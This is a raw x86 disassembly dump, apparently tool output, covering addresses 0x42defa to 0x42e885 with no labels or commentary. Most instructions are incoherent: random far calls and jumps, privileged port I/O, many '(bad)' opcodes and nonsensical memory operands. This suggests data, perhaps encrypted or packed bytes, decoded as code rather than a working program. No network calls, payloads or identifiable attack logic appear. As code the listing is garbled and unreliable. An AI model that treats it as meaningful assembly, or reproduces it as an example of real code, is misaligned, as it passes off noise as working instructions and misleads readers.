  42defa:	pop    es
  42defb:	jo     0x42df23
  42defd:	je     0x42df5b
  42deff:	adc    eax,0x7eeb6bec
  42df04:	xor    dh,BYTE PTR [ecx-0x1428541e]
  42df0a:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42df0c:	inc    esi
  42df0d:	lods   eax,DWORD PTR ds:[esi]
  42df0e:	xor    edi,DWORD PTR [edi+0x43]
  42df11:	mov    ds:0xe20396f5,al
  42df16:	dec    esi
  42df17:	jmp    0x42de9f
  42df19:	scas   al,BYTE PTR es:[edi]
  42df1a:	cmp    bl,BYTE PTR [edx]
  42df1c:	out    dx,eax
  42df1d:	fcmovnu st,st(4)
  42df1f:	lods   eax,DWORD PTR ds:[esi]
  42df20:	mov    al,ds:0x45b555d0
  42df25:	lock add esi,eax
  42df28:	jecxz  0x42dec4
  42df2a:	test   al,0x5c
  42df2c:	pop    edx
  42df2d:	xor    ecx,DWORD PTR [edx]
  42df2f:	mov    bl,0xe3
  42df31:	add    DWORD PTR [esi-0x2f],0xa7f9fe32
  42df38:	sbb    eax,DWORD PTR [edx+0x5b9544b2]
  42df3e:	push   esp
  42df3f:	adc    ebp,ecx
  42df41:	cmp    ah,BYTE PTR [eax+0x73d04ca5]
  42df47:	in     eax,dx
  42df48:	fst    DWORD PTR [edx]
  42df4a:	out    0x94,eax
  42df4c:	xor    esp,0x1e
  42df4f:	cmp    ebp,ecx
  42df51:	xchg   edi,eax
  42df52:	mov    bh,0x2b
  42df54:	pop    ecx
  42df55:	add    DWORD PTR [ecx],0x8f4cc
  42df5b:	mov    ch,0x66
  42df5d:	jbe    0x42dfba
  42df5f:	loop   0x42df0a
  42df61:	aas    
  42df62:	aam    0xe3
  42df64:	jp     0x42df77
  42df66:	leave  
  42df67:	cdq    
  42df68:	cwde   
  42df69:	bound  ecx,QWORD PTR [esi]
  42df6b:	pop    ebp
  42df6c:	fstp   st(3)
  42df6e:	ret    
  42df6f:	pop    ds
  42df70:	inc    eax
  42df71:	mov    ebp,0xa0147425
  42df76:	data16 lahf 
  42df78:	pop    ss
  42df79:	inc    esi
  42df7a:	cdq    
  42df7b:	mov    edx,0xb1cf0ba9
  42df80:	ins    DWORD PTR es:[edi],dx
  42df81:	loopne 0x42dff3
  42df83:	arpl   WORD PTR [esi+0x3e8cc81e],bx
  42df89:	mov    ebx,0x7fc20485
  42df8e:	cmp    al,0xbe
  42df90:	adc    DWORD PTR [eax],eax
  42df92:	inc    ebp
  42df93:	out    0x86,al
  42df95:	sbb    DWORD PTR [ebx+ecx*2-0x15e21327],ecx
  42df9c:	(bad)  
  42df9d:	dec    esp
  42df9e:	leave  
  42df9f:	mov    edi,DWORD PTR [ecx-0x33]
  42dfa2:	stos   DWORD PTR es:[edi],eax
  42dfa3:	or     al,0x61
  42dfa5:	fs and DWORD PTR cs:[esi-0x39862ddb],0x8e953325
  42dfb1:	xchg   edi,eax
  42dfb2:	jg     0x42df5e
  42dfb4:	add    edi,DWORD PTR [edx]
  42dfb6:	push   ds
  42dfb7:	(bad)  
  42dfb8:	jle    0x42df47
  42dfba:	fisub  DWORD PTR [edx-0x71d40307]
  42dfc0:	mov    eax,ds:0x2e8268f3
  42dfc5:	mov    ch,0x1e
  42dfc7:	and    DWORD PTR [esp+eiz*2-0x161f640c],esp
  42dfce:	or     al,0xcf
  42dfd0:	call   0xd800df5e
  42dfd5:	add    DWORD PTR [edi-0x1d79c727],ecx
  42dfdb:	cmp    BYTE PTR [esi],0xa9
  42dfde:	ss call 0xab76:0x914275f6
  42dfe6:	cmp    al,0x47
  42dfe8:	sbb    ebp,ecx
  42dfea:	cmp    eax,0x669a70
	...
  42e053:	add    BYTE PTR [eax],al
  42e055:	add    BYTE PTR [edx],al
  42e057:	(bad)  
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi+0x19]
  42e063:	retf   0x394
  42e066:	addr16 in eax,dx
  42e068:	add    DWORD PTR [eax],eax
  42e06a:	add    BYTE PTR [ecx],al
  42e06c:	add    BYTE PTR [eax],al
  42e06e:	push   cs
  42e06f:	push   esi
  42e070:	les    esi,FWORD PTR [esi+0x13]
  42e073:	sbb    BYTE PTR [esi+0x74086499],ah
  42e079:	sub    al,BYTE PTR [ebx-0x6f769854]
  42e07f:	pop    ebp
  42e080:	adc    dl,BYTE PTR [eax]
  42e082:	jnp    0x42e02d
  42e084:	add    ebx,DWORD PTR [esi]
  42e086:	scas   eax,DWORD PTR es:[edi]
  42e087:	and    bh,BYTE PTR [edi+0x35]
  42e08a:	xor    eax,0x731f2c5
  42e08f:	jge    0x42e03c
  42e091:	and    DWORD PTR [ebx+esi*1+0x6cf88c81],edi
  42e098:	test   al,0x35
  42e09a:	(bad)  
  42e09b:	push   ebx
  42e09c:	jge    0x42e111
  42e09e:	xchg   esp,eax
  42e09f:	push   edi
  42e0a0:	cmp    al,0x7f
  42e0a2:	push   ebp
  42e0a3:	repnz add eax,0xcded9b46
  42e0a9:	inc    ebx
  42e0aa:	mov    dh,0x33
  42e0ac:	lahf   
  42e0ad:	mov    edi,0xd0237e19
  42e0b2:	jmp    0x6fe9:0x950b90ea
  42e0b9:	dec    eax
  42e0ba:	inc    ebp
  42e0bb:	int    0x8c
  42e0bd:	push   edi
  42e0be:	pop    ebp
  42e0bf:	ins    BYTE PTR es:[edi],dx
  42e0c0:	std    
  42e0c1:	and    BYTE PTR [esi-0x75],cl
  42e0c4:	xlat   BYTE PTR ds:[ebx]
  42e0c5:	and    DWORD PTR [ecx],ecx
  42e0c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e0c8:	leave  
  42e0c9:	(bad)  
  42e0ca:	xchg   eax,esi
  42e0cc:	jae    0x42e0b8
  42e0ce:	nop
  42e0cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e0d0:	(bad)  
  42e0d1:	out    0xd9,eax
  42e0d3:	pop    esp
  42e0d4:	je     0x42e0fc
  42e0d6:	ja     0x42e10d
  42e0d8:	cld    
  42e0d9:	add    edi,DWORD PTR [eax+esi*1+0x6f]
  42e0dd:	in     al,0x4
  42e0df:	jne    0x42e0d4
  42e0e1:	lods   al,BYTE PTR ds:[esi]
  42e0e2:	ret    
  42e0e3:	jmp    0xb48374c
  42e0e8:	sub    BYTE PTR [esi],al
  42e0ea:	jb     0x42e0dc
  42e0ec:	ins    BYTE PTR es:[edi],dx
  42e0ed:	(bad)  [ebp-0x3e5d1d85]
  42e0f3:	pusha  
  42e0f4:	and    bl,BYTE PTR [ebx-0x606f0d12]
  42e0fa:	fld    st(1)
  42e0fc:	sar    BYTE PTR [esi],1
  42e0fe:	pushf  
  42e0ff:	add    edi,DWORD PTR ss:[edi]
  42e102:	cwde   
  42e103:	xchg   esi,eax
  42e104:	sbb    al,0xd0
  42e106:	loopne 0x42e0be
  42e108:	ins    DWORD PTR es:[edi],dx
  42e109:	and    DWORD PTR [esi],eax
  42e10b:	out    dx,eax
  42e10c:	lods   eax,DWORD PTR ds:[esi]
  42e10d:	sbb    ebx,esi
  42e10f:	push   ds
  42e110:	std    
  42e111:	popf   
  42e112:	imul   esi,DWORD PTR [edx+0x18],0xfffffff7
  42e116:	je     0x42e11c
  42e118:	push   ss
  42e119:	pusha  
  42e11a:	outs   dx,BYTE PTR ds:[esi]
  42e11b:	(bad)  
  42e11c:	in     al,dx
  42e11d:	xor    ecx,esi
  42e11f:	sub    eax,0x80fe894d
  42e124:	xchg   esi,eax
  42e125:	push   eax
  42e126:	(bad)  
  42e127:	pop    ecx
  42e128:	gs pushf 
  42e12a:	mov    bl,0x2
  42e12c:	js     0x42e17f
  42e12e:	xor    al,BYTE PTR [edi+0x42927eb8]
  42e134:	push   cs
  42e135:	add    cl,bl
  42e137:	jns    0x42e12d
  42e139:	mov    dh,0x8f
  42e13b:	rol    DWORD PTR [ebx+eiz*2-0x2d6e30b8],0x48
  42e143:	cmp    bh,BYTE PTR [edi-0xc]
  42e146:	inc    edx
  42e147:	add    eax,0x7647c604
  42e14c:	mov    WORD PTR [edx-0xa],cs
  42e14f:	jnp    0x42e138
  42e151:	mov    ah,al
  42e153:	cmp    dh,bh
  42e155:	cmp    BYTE PTR [edx-0x57],0x70
  42e159:	fwait
  42e15a:	stc    
  42e15b:	xchg   esi,eax
  42e15c:	dec    ebp
  42e15d:	or     cl,0xc3
  42e160:	pop    es
  42e161:	imul   BYTE PTR [edx]
  42e163:	inc    ebp
  42e164:	jbe    0x42e104
  42e166:	mov    eax,eax
  42e168:	out    dx,al
  42e169:	fist   DWORD PTR [ecx+0xe]
  42e16c:	int3   
  42e16d:	jns    0x42e16f
	...
  42e1d3:	add    BYTE PTR [eax],al
  42e1d5:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	scas   eax,DWORD PTR es:[edi]
  42e1e3:	pop    ds
  42e1e4:	mov    WORD PTR [esi+0x67],ss
  42e1e7:	out    dx,al
  42e1e8:	add    DWORD PTR [eax],eax
  42e1ea:	add    BYTE PTR [ecx],al
  42e1ec:	add    BYTE PTR [eax],al
  42e1ee:	cmp    DWORD PTR [eax],0xffffff84
  42e1f1:	cdq    
  42e1f2:	and    dh,BYTE PTR ds:0xba7faa2a
  42e1f8:	aas    
  42e1f9:	mov    ecx,0x150eca9b
  42e1fe:	retf   0x220d
  42e201:	shl    dl,0x41
  42e204:	xchg   DWORD PTR [edi+0xacd4aa6],ebp
  42e20a:	test   DWORD PTR [edx-0x4b],0x259637aa
  42e211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e212:	dec    eax
  42e213:	loope  0x42e219
  42e215:	sar    BYTE PTR [ebp-0x23],cl
  42e218:	neg    BYTE PTR [ecx-0x1c]
  42e21b:	fisubr WORD PTR [ebp-0x5bcb9733]
  42e221:	add    BYTE PTR [edx-0x3821739b],bh
  42e227:	ds int 0x89
  42e22a:	mov    dl,0xd6
  42e22c:	push   0x2f
  42e22e:	mov    al,ds:0xdc0216b
  42e233:	stc    
  42e234:	gs xchg esi,eax
  42e236:	mov    esp,0x13c69614
  42e23b:	fwait
  42e23c:	xchg   DWORD PTR [eax+0x4bfa99d3],ecx
  42e242:	(bad)  
  42e244:	jae    0x42e1d6
  42e246:	gs jl  0x42e244
  42e249:	js     0x42e23d
  42e24b:	outs   dx,BYTE PTR ds:[esi]
  42e24c:	paddw  mm2,QWORD PTR [eax]
  42e24f:	mov    ah,bl
  42e251:	fwait
  42e252:	pop    esi
  42e253:	xchg   edi,eax
  42e254:	aam    0xc5
  42e256:	xchg   ecx,eax
  42e257:	jle    0x42e279
  42e259:	mov    ebx,0xe09835d7
  42e25e:	test   al,0x8f
  42e260:	mov    edi,DWORD PTR [ebp+0x72]
  42e263:	ret    
  42e264:	clc    
  42e265:	jne    0x42e247
  42e267:	stos   BYTE PTR es:[edi],al
  42e268:	ret    
  42e269:	pop    es
  42e26a:	sbb    esi,DWORD PTR [ebp+0x7fe4d142]
  42e270:	(bad)  
  42e271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e272:	iret   
  42e273:	icebp  
  42e274:	sub    DWORD PTR [edx+0x38],esp
  42e277:	cwde   
  42e278:	mov    dh,0xcf
  42e27a:	xor    BYTE PTR [edi+0x3583f715],0x1c
  42e281:	in     eax,0xae
  42e283:	retf   0x5753
  42e286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e287:	push   es
  42e288:	fnstsw WORD PTR [edx+0xe3c9a84]
  42e28e:	adc    edx,DWORD PTR [esp+eax*8]
  42e291:	add    BYTE PTR [esi+edx*8-0x51711186],ah
  42e298:	lds    ecx,FWORD PTR [edx]
  42e29a:	mov    ds:0x633e346f,al
  42e29f:	les    esp,FWORD PTR [eax-0x154d8cc9]
  42e2a5:	and    ecx,eax
  42e2a7:	push   cs
  42e2a8:	outs   dx,BYTE PTR ds:[esi]
  42e2a9:	std    
  42e2aa:	mov    bl,0x79
  42e2ac:	mov    ecx,0x41ee8750
  42e2b1:	repnz int3 
  42e2b3:	inc    edx
  42e2b4:	jne    0x42e312
  42e2b6:	inc    ebp
  42e2b7:	xchg   edi,eax
  42e2b8:	clc    
  42e2b9:	pop    edx
  42e2ba:	inc    ebp
  42e2bb:	mov    ah,0x94
  42e2bd:	ss dec edi
  42e2bf:	jbe    0x42e255
  42e2c1:	xchg   ebp,eax
  42e2c2:	rcr    BYTE PTR [edi-0x7b888a68],cl
  42e2c8:	mov    bl,0xb7
  42e2ca:	jle    0x42e2e5
  42e2cc:	(bad)
  42e2cf:	jbe    0x42e2e9
  42e2d1:	xor    eax,0xeb62cd45
  42e2d6:	sub    al,0x3a
  42e2d8:	xchg   ecx,eax
  42e2d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e2da:	xor    al,0x33
  42e2dc:	push   ebp
  42e2dd:	push   edx
  42e2de:	bound  eax,QWORD PTR [ecx+eiz*4]
  42e2e1:	push   esi
  42e2e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e2e3:	sbb    esi,DWORD PTR [ebp+edi*4+0x7491176]
  42e2ea:	mov    esp,DWORD PTR [ebp+0x1]
  42e2ed:	jmp    0x42e2ef
	...
  42e353:	add    BYTE PTR [eax],al
  42e355:	add    BYTE PTR [ebp-0x655875c3],ch
  42e35b:	mov    bh,0xad
  42e35d:	aas    
  42e35e:	mov    ebx,0xd7199140
  42e363:	xlat   BYTE PTR ds:[ebx]
  42e364:	dec    edx
  42e366:	addr16 out dx,eax
  42e368:	add    DWORD PTR [eax],eax
  42e36a:	add    BYTE PTR [ecx],al
  42e36c:	add    BYTE PTR [eax],al
  42e36e:	jb     0x42e30e
  42e370:	je     0x42e3e6
  42e372:	inc    edi
  42e373:	stc    
  42e374:	scas   eax,DWORD PTR es:[edi]
  42e375:	sbb    eax,0x89747bc5
  42e37a:	xor    esi,DWORD PTR [ebp+0x3a]
  42e37d:	mov    ecx,ds
  42e37f:	adc    edi,DWORD PTR [eax-0x25973f3e]
  42e385:	cmp    edx,DWORD PTR [esi]
  42e387:	cmp    BYTE PTR [ebx+0x32],dl
  42e38a:	xchg   esp,eax
  42e38b:	xlat   BYTE PTR ds:[ebx]
  42e38c:	fcmovnbe st,st(7)
  42e38e:	outs   dx,DWORD PTR ds:[esi]
  42e38f:	push   edx
  42e390:	call   0xe24b:0x2ca33331
  42e397:	cmp    eax,0xa31cc2c4
  42e39c:	cwde   
  42e39d:	xor    edi,DWORD PTR [ecx]
  42e39f:	imul   esi,DWORD PTR [esi+0x3d],0x6c
  42e3a3:	pop    eax
  42e3a4:	pop    esp
  42e3a5:	mov    al,0x9
  42e3a7:	pop    edx
  42e3a8:	pop    esp
  42e3a9:	sbb    dl,dl
  42e3ab:	mov    ch,0x51
  42e3ad:	sub    BYTE PTR [eax+0x8a0bad3],al
  42e3b3:	pop    esp
  42e3b4:	xchg   edi,eax
  42e3b5:	adc    esp,DWORD PTR [edi+0x527c3174]
  42e3bb:	fwait
  42e3bc:	nop
  42e3bd:	dec    ebp
  42e3be:	in     al,dx
  42e3bf:	add    dh,BYTE PTR [esi+0x7f]
  42e3c2:	test   dl,ah
  42e3c4:	push   ss
  42e3c5:	mov    ds:0xf2ebdaf6,al
  42e3ca:	mov    esp,0x59951136
  42e3cf:	jnp    0x42e39f
  42e3d1:	imul   ebp,DWORD PTR [ebx+eiz*1+0x66f9181b]
  42e3d9:	not    ebx
  42e3db:	ins    DWORD PTR es:[edi],dx
  42e3dc:	scas   eax,DWORD PTR es:[edi]
  42e3dd:	adc    BYTE PTR [ebx],bh
  42e3df:	outs   dx,BYTE PTR ds:[esi]
  42e3e0:	lock sbb BYTE PTR [esi+0x1a337ee3],bh
  42e3e7:	pop    ss
  42e3e8:	mov    ah,0x77
  42e3ea:	cli    
  42e3eb:	rcr    BYTE PTR [ebx],1
  42e3ed:	or     al,0x89
  42e3ef:	or     BYTE PTR [ebx-0x24],0x2a
  42e3f3:	mov    ch,0xf5
  42e3f5:	fsub   QWORD PTR [ebx-0x6d]
  42e3f8:	dec    edi
  42e3f9:	bound  esi,QWORD PTR [ebx-0x5a095956]
  42e3ff:	imul   eax,esi,0x39aa5195
  42e405:	push   ds
  42e406:	mov    al,ds:0xbbe126c6
  42e40b:	sbb    ecx,DWORD PTR [ecx-0x10858178]
  42e411:	sbb    al,0x2d
  42e413:	ficom  WORD PTR ds:[ecx-0x25]
  42e417:	aam    0x3b
  42e419:	push   esp
  42e41a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e41b:	mov    ah,0x7b
  42e41d:	jne    0x42e492
  42e41f:	jp     0x42e49c
  42e421:	les    esp,FWORD PTR [ecx+0x58]
  42e424:	cs mov edi,0x5b8a38db
  42e42a:	cmp    BYTE PTR [ecx-0xfa1dc6b],dl
  42e430:	push   0x2b
  42e432:	fwait
  42e433:	jne    0x42e4a0
  42e435:	outs   dx,DWORD PTR ds:[esi]
  42e436:	xor    BYTE PTR [ecx-0x26],dh
  42e439:	jg     0x42e414
  42e43b:	dec    eax
  42e43c:	mov    ?,WORD PTR [ebx+0x49]
  42e43f:	adc    BYTE PTR [ebp-0x3046aebb],bl
  42e445:	ret    
  42e446:	xor    eax,0x84be124b
  42e44b:	adc    eax,0x676ff255
  42e450:	sub    bl,BYTE PTR [ecx-0x47]
  42e453:	pushf  
  42e454:	or     dh,dl
  42e456:	fimul  WORD PTR [edx+0x7ef45fb0]
  42e45c:	das    
  42e45d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e45e:	xchg   esi,eax
  42e45f:	retf   0x69fc
  42e462:	sahf   
  42e463:	in     al,dx
  42e464:	push   ebp
  42e465:	xor    eax,0xc00fd253
  42e46a:	pop    edi
  42e46b:	sbb    BYTE PTR [ebx-0x5d],ch
	...
  42e4d6:	loop   0x42e495
  42e4d8:	fadd   st(7),st
  42e4da:	(bad)  
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	lods   al,BYTE PTR ds:[esi]
  42e4e3:	add    DWORD PTR [eax+0x1f06720],edx
  42e4e9:	add    BYTE PTR [eax],al
  42e4eb:	add    DWORD PTR [eax],eax
  42e4ed:	add    BYTE PTR [esi+0x40],bh
  42e4f0:	into   
  42e4f1:	push   edi
  42e4f2:	or     al,BYTE PTR [esi]
  42e4f4:	call   0x7a28:0xd1ebc246
  42e4fb:	arpl   WORD PTR [esi-0x52e7e163],di
  42e501:	pop    esi
  42e502:	jns    0x42e48d
  42e504:	mov    cl,0x74
  42e506:	(bad)  
  42e507:	pop    esi
  42e508:	ins    DWORD PTR es:[edi],dx
  42e509:	cmp    BYTE PTR [ebx+0x158c2e84],bh
  42e50f:	shl    cl,0x2c
  42e512:	test   eax,0x78e70eda
  42e517:	push   ss
  42e518:	lea    esp,[eax+0x76]
  42e51b:	retf   0x4339
  42e51e:	xchg   edx,eax
  42e51f:	iretw  
  42e521:	push   bp
  42e523:	mov    eax,0x95eca748
  42e528:	dec    ebp
  42e529:	lock imul BYTE PTR [eax-0x2e]
  42e52d:	push   ds
  42e52e:	inc    ecx
  42e52f:	std    
  42e530:	mov    edx,DWORD PTR [edi+0x3dcc76f7]
  42e536:	lea    ecx,[ebp-0x69]
  42e539:	pop    ss
  42e53a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e53b:	scas   eax,DWORD PTR es:[edi]
  42e53c:	lahf   
  42e53d:	mov    ds:0x26ddb831,al
  42e542:	xchg   esi,eax
  42e543:	pop    es
  42e544:	int    0x79
  42e546:	sbb    BYTE PTR [esi+ecx*2-0x1d],ah
  42e54a:	pop    ebx
  42e54b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e54c:	je     0x42e55c
  42e54e:	sub    DWORD PTR [ebx],edi
  42e550:	fiadd  DWORD PTR [edi]
  42e552:	mov    eax,ds:0x2b739969
  42e557:	mov    ds,WORD PTR [edi-0x4457e72]
  42e55d:	inc    esp
  42e55e:	xchg   esi,eax
  42e55f:	xor    ebx,ecx
  42e561:	(bad)  
  42e562:	and    bh,BYTE PTR [edi-0x5d52be34]
  42e568:	pusha  
  42e569:	and    eax,0x3d0f6f77
  42e56e:	lods   eax,DWORD PTR ds:[esi]
  42e56f:	mov    bh,0x60
  42e571:	sub    cl,BYTE PTR [ebp+0x79]
  42e574:	cmp    DWORD PTR [edi+0x52],edx
  42e577:	jg     0x42e53f
  42e579:	xchg   esi,eax
  42e57a:	mov    ds:0x6450d138,ax
  42e580:	jp     0x42e531
  42e582:	xchg   ebx,eax
  42e583:	xchg   esi,eax
  42e584:	sbb    BYTE PTR [ebx],ch
  42e586:	enter  0xcdcf,0xb1
  42e58a:	call   0x8a1b:0x5526b5e0
  42e591:	adc    al,0xc5
  42e593:	mov    al,0x16
  42e595:	ret    0x1ad1
  42e598:	out    dx,eax
  42e599:	dec    edi
  42e59a:	mov    ch,0xee
  42e59c:	lods   eax,DWORD PTR ds:[esi]
  42e59d:	mov    ecx,0x1eda5f9c
  42e5a2:	jle    0x42e5de
  42e5a4:	stos   BYTE PTR es:[edi],al
  42e5a5:	shr    ebx,0xdf
  42e5a8:	scas   eax,DWORD PTR es:[edi]
  42e5a9:	adc    al,0x26
  42e5ab:	clc    
  42e5ac:	cmp    eax,0x1d3c4d32
  42e5b1:	in     eax,0x69
  42e5b3:	jge    0x42e5b7
  42e5b5:	gs repnz inc eax
  42e5b8:	jno    0x42e59e
  42e5ba:	mov    esp,0xca779bec
  42e5bf:	xchg   ecx,eax
  42e5c0:	mov    eax,ds:0xb13d6ddb
  42e5c5:	outs   dx,BYTE PTR ds:[esi]
  42e5c6:	imul   edi,DWORD PTR [eax+0x22],0x9a01b7b9
  42e5cd:	sub    ebp,0x3
  42e5d0:	push   ebp
  42e5d1:	cs sub eax,0x4da492ba
  42e5d7:	out    dx,eax
  42e5d8:	jecxz  0x42e591
  42e5da:	retf   0x1649
  42e5dd:	gs push ds
  42e5df:	jmp    0xdb469f69
  42e5e4:	pop    ds
  42e5e5:	and    DWORD PTR [ebx+0x30b7fdd],0xaa4409
	...
  42e653:	add    BYTE PTR [eax],al
  42e655:	add    BYTE PTR [ebp+0x38],dl
  42e658:	into   
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	adc    BYTE PTR [edi+esi*4-0x44],bl
  42e666:	addr16 icebp 
  42e668:	add    DWORD PTR [eax],eax
  42e66a:	add    BYTE PTR [ecx],al
  42e66c:	add    BYTE PTR [eax],al
  42e66e:	pop    ds
  42e66f:	dec    esi
  42e670:	out    0x6c,eax
  42e672:	jbe    0x42e66a
  42e674:	inc    esi
  42e675:	lahf   
  42e676:	xlat   BYTE PTR ds:[ebx]
  42e677:	xchg   DWORD PTR [ebp-0x16b1012e],ebp
  42e67d:	or     bh,bl
  42e67f:	push   esp
  42e680:	sub    BYTE PTR [ebx+0x19539de8],0x61
  42e687:	enter  0x168,0xd9
  42e68b:	or     ecx,DWORD PTR [edi]
  42e68d:	or     BYTE PTR [ecx-0x1ea146ae],0x3a
  42e694:	shl    DWORD PTR [edi+0x3a],cl
  42e697:	stos   BYTE PTR es:[edi],al
  42e698:	jo     0x42e6e8
  42e69a:	mov    ch,0x3
  42e69c:	fild   WORD PTR [edi]
  42e69e:	or     esp,DWORD PTR [ebp-0x5d9227c1]
  42e6a4:	sbb    DWORD PTR [ebx-0x4b],esp
  42e6a7:	jp     0x42e689
  42e6a9:	stos   BYTE PTR es:[edi],al
  42e6aa:	mov    ch,0xe1
  42e6ac:	sub    eax,0xb60ed99
  42e6b1:	hlt    
  42e6b2:	sbb    al,0x63
  42e6b4:	clc    
  42e6b5:	outs   dx,DWORD PTR ds:[esi]
  42e6b6:	mov    dl,0x4b
  42e6b8:	std    
  42e6b9:	or     al,0xba
  42e6bb:	je     0x42e683
  42e6bd:	cmp    ch,dl
  42e6bf:	into   
  42e6c0:	outs   dx,DWORD PTR ds:[esi]
  42e6c1:	dec    ebx
  42e6c2:	or     cl,BYTE PTR [esi]
  42e6c4:	pop    esp
  42e6c5:	push   ss
  42e6c6:	jecxz  0x42e6c4
  42e6c8:	mov    esi,0x75d1f0a8
  42e6cd:	and    DWORD PTR [edx+0x351cfab8],ebp
  42e6d3:	test   eax,0x743302a8
  42e6d8:	dec    esi
  42e6d9:	loop   0x42e660
  42e6db:	and    eax,0xce4c999f
  42e6e0:	bound  ebp,QWORD PTR [edx+0x1e]
  42e6e3:	inc    ebp
  42e6e4:	and    al,0x54
  42e6e6:	int3   
  42e6e7:	sbb    cl,dl
  42e6e9:	mov    al,0xeb
  42e6eb:	push   ss
  42e6ec:	adc    al,0xb6
  42e6ee:	in     al,dx
  42e6ef:	push   0x6c8a1bdd
  42e6f4:	push   eax
  42e6f5:	daa    
  42e6f6:	pop    ss
  42e6f7:	les    esp,FWORD PTR [eax-0x2bd1282d]
  42e6fd:	fnstenv [eax]
  42e6ff:	mov    al,ds:0xf69a6827
  42e704:	and    eax,DWORD PTR [esi-0x35]
  42e707:	and    esi,edi
  42e709:	icebp  
  42e70a:	icebp  
  42e70b:	mov    WORD PTR [ebx],es
  42e70d:	das    
  42e70e:	sub    eax,0x63dacb57
  42e713:	fisub  DWORD PTR [edi-0x316ec518]
  42e719:	ins    DWORD PTR es:[edi],dx
  42e71a:	xor    edx,DWORD PTR [esp+eax*4]
  42e71d:	jae    0x42e6d1
  42e71f:	outs   dx,BYTE PTR ds:[esi]
  42e720:	sar    BYTE PTR [ebp-0x64],cl
  42e723:	pushf  
  42e724:	jecxz  0x42e730
  42e726:	or     BYTE PTR [edx-0x46],bl
  42e729:	push   ds
  42e72a:	sti    
  42e72b:	call   0x2dc22a8a
  42e730:	retf   0x3978
  42e733:	jle    0x42e700
  42e735:	mov    ds:0xfa94fb6a,al
  42e73a:	mov    cl,al
  42e73c:	push   esi
  42e73d:	pop    ss
  42e73e:	pop    ss
  42e73f:	test   al,0x8e
  42e741:	je     0x42e73d
  42e743:	sti    
  42e744:	sbb    eax,0xb2e53f32
  42e749:	stc    
  42e74a:	pop    edx
  42e74b:	dec    edi
  42e74c:	test   al,0x88
  42e74e:	xchg   ecx,eax
  42e74f:	add    edi,DWORD PTR [ebx+0x5c]
  42e752:	push   cs
  42e753:	jae    0x42e785
  42e755:	ja     0x42e71b
  42e757:	mov    edx,0xdb7bca5d
  42e75c:	or     eax,0x9b6b8805
  42e761:	xor    DWORD PTR [ebp-0x53],0xc7150c72
  42e768:	mov    dh,bh
  42e76a:	jecxz  0x42e711
  42e76c:	idiv   BYTE PTR [edx]
	...
  42e7d6:	pop    edx
  42e7d7:	cmp    DWORD PTR [esi+0x2d],ecx
  42e7da:	outs   dx,DWORD PTR ds:[esi]
  42e7db:	jg     0x42e858
  42e7dd:	jg     0x42e843
  42e7df:	sub    BYTE PTR [esi],cl
  42e7e1:	ficomp DWORD PTR [ebp+0x6760ab52]
  42e7e7:	repnz add DWORD PTR [eax],eax
  42e7ea:	add    BYTE PTR [ecx],al
  42e7ec:	add    BYTE PTR [eax],al
  42e7ee:	jecxz  0x42e779
  42e7f0:	fs in  al,0xc6
  42e7f3:	or     edi,ecx
  42e7f5:	pusha  
  42e7f6:	fs adc eax,0x332cb6bd
  42e7fc:	sbb    dh,dl
  42e7fe:	adc    cl,BYTE PTR [eax-0x127e3c28]
  42e804:	mov    ch,0x33
  42e806:	test   eax,0xe9f97292
  42e80b:	pop    ss
  42e80c:	xchg   DWORD PTR [ebx+0x55],ebp
  42e80f:	mov    eax,esp
  42e811:	mov    esi,0x22901bf4
  42e816:	test   BYTE PTR [eax-0x5d],0xc5
  42e81a:	or     dh,0x55
  42e81d:	mov    cl,0x58
  42e81f:	jle    0x42e82a
  42e821:	jge    0x42e7f1
  42e823:	imul   edx,DWORD PTR [ebp+ebx*8-0x26],0xffffffb9
  42e828:	sbb    DWORD PTR [edx+0x2937869d],ecx
  42e82e:	ret    
  42e82f:	mov    ecx,0xf1574160
  42e834:	arpl   bp,dx
  42e836:	retf   
  42e837:	(bad)  
  42e839:	ret    0xb7aa
  42e83c:	inc    edx
  42e83d:	out    dx,al
  42e83e:	inc    ebx
  42e83f:	xchg   dl,al
  42e841:	and    dh,dl
  42e843:	jnp    0x42e82b
  42e845:	push   es
  42e846:	sub    BYTE PTR [eax+edx*1-0x46],bh
  42e84a:	mov    cl,BYTE PTR [eax]
  42e84c:	pushf  
  42e84d:	pushf  
  42e84e:	or     esi,DWORD PTR [ecx-0x1f]
  42e851:	or     ah,ch
  42e853:	rcl    DWORD PTR [ebx-0x68181d45],cl
  42e859:	push   edx
  42e85a:	int3   
  42e85b:	add    eax,0xab542182
  42e860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e861:	ins    BYTE PTR es:[edi],dx
  42e862:	xchg   edi,eax
  42e863:	test   bh,dl
  42e865:	mov    esp,0x29a19566
  42e86a:	and    edx,edi
  42e86c:	das    
  42e86d:	mov    WORD PTR ds:0x923fb8de,gs
  42e873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e874:	hlt    
  42e875:	rcr    DWORD PTR [edx],0x8a
  42e878:	jae    0x42e8f9
  42e87a:	ror    ch,1
  42e87c:	in     eax,dx
  42e87d:	mov    cl,BYTE PTR [ebx]
  42e87f:	(bad)
  42e884:	xchg   ebx,eax
  42e885:	(bad)  
